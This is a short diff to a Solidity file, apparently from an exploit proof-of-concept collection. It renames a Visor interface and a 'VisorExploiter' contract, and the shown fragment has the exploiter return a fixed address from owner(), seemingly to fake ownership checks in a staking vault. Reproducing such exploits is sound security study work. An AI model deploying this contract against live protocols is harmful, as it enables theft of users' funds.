@@ -179,7 +179,7 @@ interface UniswapV2Interface {
     receive() external payable;
 }
 
-interface VisorInterface {
+interface VisrInterface {
     function deposit(uint256 visrDeposit, address from, address to) external returns (uint256 shares);
 
     function owner() external view returns (address);
@@ -197,7 +197,7 @@ interface VisorInterface {
     function withdraw(uint256 shares, address to, address from) external returns (uint256 rewards);
 }
 
-contract VisorExploiter {
+contract VisrExploiter {
     function owner() public pure returns (address) {
         address a = address(0x7);
         return a;
